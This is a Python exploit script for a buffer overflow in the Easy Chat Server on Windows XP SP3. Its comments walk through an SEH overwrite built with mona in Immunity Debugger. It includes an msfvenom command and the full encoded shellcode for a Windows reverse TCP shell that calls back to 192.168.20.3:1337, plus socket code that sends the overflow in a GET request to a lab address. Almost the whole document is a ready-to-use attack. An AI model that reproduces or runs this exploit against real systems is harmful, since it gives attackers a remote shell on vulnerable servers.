#Exploit for the Easy chat server on windows xp 3
#https://www.exploit-db.com/exploits/11179/
#!mona nosafeseh nseh="\xeb\x06\x90\x90"
#\xeb\x06 --> JMP 06 ; short jmp
#SSLEAY32.dll module has safeseh disabled and has the base address starting from 1 instead of a null (00)
#pop r32 pop r32 retn --> search string in immunity debugger
#!mona seh -all
#popEsi popEdi retn at \xc0\x03\x01\x10 ; 100103C0
#!/usr/bin/python
# bundle exec msfvenom -p windows/shell/reverse_tcp --platform windows -a x86 EXITFUNC=seh LHOST=192.168.20.3 LPORT=1337 -b "/x00/x0a/x0d/x20" -f python

import socket, sys
buf =  ""
buf += "\xba\x95\x4e\xdd\x74\xd9\xe8\xd9\x74\x24\xf4\x5e\x29"
buf += "\xc9\xb1\x57\x31\x56\x12\x83\xee\xfc\x03\xc3\x40\x3f"
buf += "\x81\x17\xb4\x3d\x6a\xe7\x45\x22\xe2\x02\x74\x62\x90"
buf += "\x47\x27\x52\xd2\x05\xc4\x19\xb6\xbd\x5f\x6f\x1f\xb2"
buf += "\xe8\xda\x79\xfd\xe9\x77\xb9\x9c\x69\x8a\xee\x7e\x53"
buf += "\x45\xe3\x7f\x94\xb8\x0e\x2d\x4d\xb6\xbd\xc1\xfa\x82"
buf += "\x7d\x6a\xb0\x03\x06\x8f\x01\x25\x27\x1e\x19\x7c\xe7"
buf += "\xa1\xce\xf4\xae\xb9\x13\x30\x78\x32\xe7\xce\x7b\x92"
buf += "\x39\x2e\xd7\xdb\xf5\xdd\x29\x1c\x31\x3e\x5c\x54\x41"
buf += "\xc3\x67\xa3\x3b\x1f\xed\x37\x9b\xd4\x55\x93\x1d\x38"
buf += "\x03\x50\x11\xf5\x47\x3e\x36\x08\x8b\x35\x42\x81\x2a"
buf += "\x99\xc2\xd1\x08\x3d\x8e\x82\x31\x64\x6a\x64\x4d\x76"
buf += "\xd5\xd9\xeb\xfd\xf8\x0e\x86\x5c\x95\xe3\xab\x5e\x65"
buf += "\x6c\xbb\x2d\x57\x33\x17\xb9\xdb\xbc\xb1\x3e\x6d\xaa"
buf += "\x41\x90\xd5\xbb\xbf\x10\x26\x95\x7b\x44\x76\x8d\xaa"
buf += "\xe4\x1d\x4d\x52\x31\x8b\x47\xc4\x79\xe4\x4c\x17\x11"
buf += "\xf7\x6c\x12\xd8\x7e\x8a\x4c\x4a\xd1\x03\x2d\x3a\x91"
buf += "\xf3\xc5\x50\x1e\x2b\xf5\x5b\xf4\x44\x9c\xb3\xa1\x3d"
buf += "\x09\x2a\xe8\xb6\xa8\xb3\x26\xb3\xeb\x3f\xc3\x43\xa5"
buf += "\xb7\xa6\x57\xd2\xa0\x48\xa8\x23\x44\x49\xc2\x27\xce"
buf += "\x1e\x7a\x2a\x37\x68\x25\xd5\x12\xea\x22\x29\xe2\xdb"
buf += "\x59\x1c\x70\x64\x36\x61\x94\x64\xc6\x37\xfe\x64\xae"
buf += "\xef\x5a\x37\xcb\xef\x77\x2b\x40\x7a\x77\x1a\x34\x2d"
buf += "\x1f\xa0\x63\x19\x80\x5b\x46\x19\xc6\xa4\x14\x36\x6e"
buf += "\xcd\xe6\x06\x8e\x0d\x8d\x86\xde\x65\x5a\xa8\xd1\x45"
buf += "\xa3\x63\xba\xcd\x2e\xe2\x09\x6f\x2e\x2f\xcf\x31\x2f"
buf += "\xdc\xcb\xc2\x4a\xad\xec\x22\xab\xa7\x89\x22\xab\xc7"
buf += "\xac\x1f\x7d\xfe\xdb\x5e\xbd\x45\xdd\x6f\x70\x50\x4b"
buf += "\x70\x27\x5b\x5e\x1a\xc7\x60"
buff = 'A' * 216 + '\xeb\x06\x90\x90' + '\xc0\x03\x01\x10' + buf * (2000-216-8-371)
request = 'GET /chat.ghp?username=' + buff + '&password=&room=1&sex=2 HTTP/1.1\r\n\r\n'
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.20.2', 80))
s.send(request)
s.close()

